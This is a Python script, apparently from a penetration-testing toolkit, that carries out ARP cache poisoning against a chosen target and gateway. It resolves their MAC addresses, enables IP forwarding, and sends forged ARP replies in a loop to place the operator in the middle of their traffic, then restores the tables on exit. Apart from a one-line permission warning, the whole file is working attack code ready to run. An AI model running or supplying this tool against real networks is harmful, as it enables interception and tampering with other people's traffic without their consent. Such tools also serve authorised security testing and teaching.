#!/usr/bin/env python3

import os
import sys
import time
import logging
import subprocess
import ipaddress
from datetime import datetime
from typing import List, Optional, Tuple, TextIO

logging.basicConfig(level=logging.INFO, format="%(message)s")

COLOR_ENABLED = sys.stdout.isatty()
COLOR_RESET = "\033[0m" if COLOR_ENABLED else ""
COLOR_HEADER = "\033[36m" if COLOR_ENABLED else ""
COLOR_HIGHLIGHT = "\033[35m" if COLOR_ENABLED else ""
COLOR_SUCCESS = "\033[32m" if COLOR_ENABLED else ""
COLOR_WARNING = "\033[33m" if COLOR_ENABLED else ""
COLOR_ERROR = "\033[31m" if COLOR_ENABLED else ""
STYLE_BOLD = "\033[1m" if COLOR_ENABLED else ""

MODULE_DIR = os.path.dirname(os.path.abspath(__file__))
PROJECT_ROOT = os.path.dirname(MODULE_DIR)
LOG_DIR = os.path.join(PROJECT_ROOT, "log")

try:
    from scapy.all import ARP, Ether, send, srp, conf  # type: ignore
    SCAPY_AVAILABLE = True
    conf.verb = 0
except Exception:
    SCAPY_AVAILABLE = False
    ARP = None  # type: ignore
    Ether = None  # type: ignore


ARP_INTERVAL_SECONDS = 2.0


def color_text(text: str, color: str) -> str:
    return f"{color}{text}{COLOR_RESET}" if color else text


def style(text: str, *styles: str) -> str:
    prefix = "".join(s for s in styles if s)
    return f"{prefix}{text}{COLOR_RESET}" if prefix else text


def list_network_interfaces() -> List[str]:
    interfaces: List[str] = []
    ip_link = subprocess.run(["ip", "-o", "link", "show"], stdout=subprocess.PIPE, text=True, check=False)
    for line in ip_link.stdout.splitlines():
        if ": " in line:
            name = line.split(": ", 1)[1].split(":", 1)[0]
            if name and name != "lo":
                interfaces.append(name)
    return interfaces


def get_interface_chipset(interface: str) -> str:
    try:
        result = subprocess.run(
            ["ethtool", "-i", interface],
            stdout=subprocess.PIPE,
            stderr=subprocess.DEVNULL,
            text=True,
            check=False,
        )
    except FileNotFoundError:
        return "unknown"

    if result.returncode != 0:
        return "unknown"

    driver = None
    bus_info = None
    for line in result.stdout.splitlines():
        if line.startswith("driver:"):
            driver = line.split(":", 1)[1].strip()
        if line.startswith("bus-info:"):
            bus_info = line.split(":", 1)[1].strip()

    if driver and bus_info and bus_info != "":
        return f"{driver} ({bus_info})"
    if driver:
        return driver
    return "unknown"


def get_default_gateway() -> Tuple[Optional[str], Optional[str]]:
    result = subprocess.run(
        ["ip", "route", "show", "default"],
        stdout=subprocess.PIPE,
        stderr=subprocess.DEVNULL,
        text=True,
        check=False,
    )
    if result.returncode != 0:
        return None, None
    for line in result.stdout.splitlines():
        parts = line.split()
        gateway = None
        interface = None
        if "via" in parts:
            idx = parts.index("via")
            if idx + 1 < len(parts):
                gateway = parts[idx + 1]
        if "dev" in parts:
            idx = parts.index("dev")
            if idx + 1 < len(parts):
                interface = parts[idx + 1]
        if gateway or interface:
            return gateway, interface
    return None, None


def select_interface(interfaces: List[str], default_iface: Optional[str]) -> str:
    if interfaces:
        logging.info("")
        logging.info(style("Available interfaces:", STYLE_BOLD))
        for index, name in enumerate(interfaces, start=1):
            chipset = get_interface_chipset(name)
            label = f"{index}) {name} -"
            logging.info("  %s %s", color_text(label, COLOR_HIGHLIGHT), chipset)
    else:
        logging.warning("No network interfaces detected.")

    while True:
        default_hint = f" (Enter for {default_iface})" if default_iface else ""
        choice = input(f"{style('Select interface', STYLE_BOLD)}{default_hint}: ").strip()
        if not choice:
            if default_iface:
                return default_iface
            if not interfaces:
                logging.warning("Please enter an interface name.")
                continue
        if choice.isdigit() and interfaces:
            idx = int(choice)
            if 1 <= idx <= len(interfaces):
                return interfaces[idx - 1]
        if choice in interfaces or (choice and not interfaces):
            return choice
        logging.warning("Invalid selection. Try again.")


def prompt_ip(label: str, default_value: Optional[str] = None) -> str:
    while True:
        hint = f" [{default_value}]" if default_value else ""
        raw = input(f"{style(label, STYLE_BOLD)}{hint}: ").strip()
        if not raw:
            if default_value:
                return default_value
            logging.warning("Value cannot be empty.")
            continue
        try:
            ipaddress.ip_address(raw)
            return raw
        except ValueError:
            logging.warning("Invalid IP address. Try again.")


def prompt_yes_no(message: str, default_yes: bool = True) -> bool:
    try:
        response = input(style(message, STYLE_BOLD)).strip().lower()
    except EOFError:
        return default_yes
    if not response:
        return default_yes
    return response in {"y", "yes"}


def get_ip_forward_state() -> Optional[str]:
    path = "/proc/sys/net/ipv4/ip_forward"
    if not os.path.isfile(path):
        return None
    try:
        with open(path, "r", encoding="utf-8") as handle:
            return handle.read().strip()
    except OSError:
        return None


def set_ip_forward(enabled: bool) -> bool:
    path = "/proc/sys/net/ipv4/ip_forward"
    value = "1" if enabled else "0"
    if os.path.isfile(path):
        try:
            with open(path, "w", encoding="utf-8") as handle:
                handle.write(value)
            return True
        except OSError:
            return False
    result = subprocess.run(
        ["sysctl", "-w", f"net.ipv4.ip_forward={value}"],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        check=False,
    )
    return result.returncode == 0


def get_mac(ip_address: str, interface: str) -> Optional[str]:
    if not Ether or not ARP:
        return None
    answered, _ = srp(
        Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip_address),
        timeout=2,
        retry=2,
        iface=interface,
        verbose=False,
    )
    for _, response in answered:
        return response.hwsrc
    return None


def send_spoof(dst_ip: str, dst_mac: str, src_ip: str, interface: str) -> None:
    if not ARP:
        return
    packet = ARP(op=2, pdst=dst_ip, hwdst=dst_mac, psrc=src_ip)
    send(packet, iface=interface, verbose=False)


def send_restore(dst_ip: str, dst_mac: str, src_ip: str, src_mac: str, interface: str) -> None:
    if not ARP:
        return
    packet = ARP(op=2, pdst=dst_ip, hwdst=dst_mac, psrc=src_ip, hwsrc=src_mac)
    send(packet, iface=interface, verbose=False, count=5)


def create_log_file(prefix: str) -> Tuple[TextIO, str]:
    os.makedirs(LOG_DIR, exist_ok=True)
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"{prefix}_{timestamp}.txt"
    path = os.path.join(LOG_DIR, filename)
    handle = open(path, "w", encoding="utf-8")
    return handle, path


def log_event(handle: TextIO, message: str, color: Optional[str] = None) -> None:
    if color:
        logging.info(color_text(message, color))
    else:
        logging.info(message)
    handle.write(message + "\n")
    handle.flush()


def main() -> None:
    logging.info(color_text("ARP Spoof", COLOR_HEADER))
    logging.info("ARP cache poisoning (MITM)")
    logging.info("")

    if os.geteuid() != 0:
        logging.error("This script must be run as root!")
        sys.exit(1)

    if not SCAPY_AVAILABLE:
        logging.error("Scapy is not installed. Install with: pip3 install scapy")
        sys.exit(1)

    required_tools = ["ip", "ethtool"]
    for tool in required_tools:
        if subprocess.run(["which", tool], stdout=subprocess.DEVNULL).returncode != 0:
            logging.error("Required tool '%s' not found!", tool)
            sys.exit(1)

    logging.info(style("IMPORTANT:", COLOR_WARNING, STYLE_BOLD))
    logging.info("Use only on networks you own or have explicit permission to test.")

    default_gateway, default_iface = get_default_gateway()
    interfaces = list_network_interfaces()
    interface = select_interface(interfaces, default_iface)

    logging.info("")
    target_ip = prompt_ip("Target IP")
    gateway_ip = prompt_ip("Gateway IP", default_gateway)

    logging.info("")
    if not prompt_yes_no("Start ARP spoofing? [Y/n]: "):
        logging.info(color_text("ARP spoof cancelled.", COLOR_WARNING))
        return

    log_handle, log_path = create_log_file("arp_spoof")
    log_event(log_handle, f"Log file: {log_path}", COLOR_SUCCESS)
    log_event(log_handle, f"Interface: {interface}")
    log_event(log_handle, f"Target: {target_ip}")
    log_event(log_handle, f"Gateway: {gateway_ip}")

    previous_forward = get_ip_forward_state()
    if previous_forward != "1":
        if set_ip_forward(True):
            log_event(log_handle, "IP forwarding enabled.")
        else:
            log_event(log_handle, "Failed to enable IP forwarding.", COLOR_WARNING)

    target_mac = get_mac(target_ip, interface)
    gateway_mac = get_mac(gateway_ip, interface)

    if not target_mac or not gateway_mac:
        log_event(log_handle, "Failed to resolve target or gateway MAC address.", COLOR_ERROR)
        if previous_forward is not None and previous_forward != "1":
            set_ip_forward(False)
        log_handle.close()
        input(style("Press Enter to return.", STYLE_BOLD))
        return

    log_event(log_handle, f"Target MAC: {target_mac}")
    log_event(log_handle, f"Gateway MAC: {gateway_mac}")

    logging.info("")
    logging.info(style("ARP spoofing active. Press Ctrl+C to stop.", STYLE_BOLD))

    try:
        while True:
            send_spoof(target_ip, target_mac, gateway_ip, interface)
            send_spoof(gateway_ip, gateway_mac, target_ip, interface)
            time.sleep(ARP_INTERVAL_SECONDS)
    except KeyboardInterrupt:
        logging.info("")
        log_event(log_handle, "Stopping ARP spoof...", COLOR_WARNING)
    finally:
        send_restore(target_ip, target_mac, gateway_ip, gateway_mac, interface)
        send_restore(gateway_ip, gateway_mac, target_ip, target_mac, interface)
        log_event(log_handle, "Restored ARP tables.")
        if previous_forward is not None and previous_forward != "1":
            if set_ip_forward(False):
                log_event(log_handle, "IP forwarding restored.")
            else:
                log_event(log_handle, "Failed to restore IP forwarding.", COLOR_WARNING)
        log_handle.close()

    logging.info("")
    logging.info(f"Log saved to: {log_path}")
    input(style("Press Enter to return.", STYLE_BOLD))


if __name__ == "__main__":
    main()
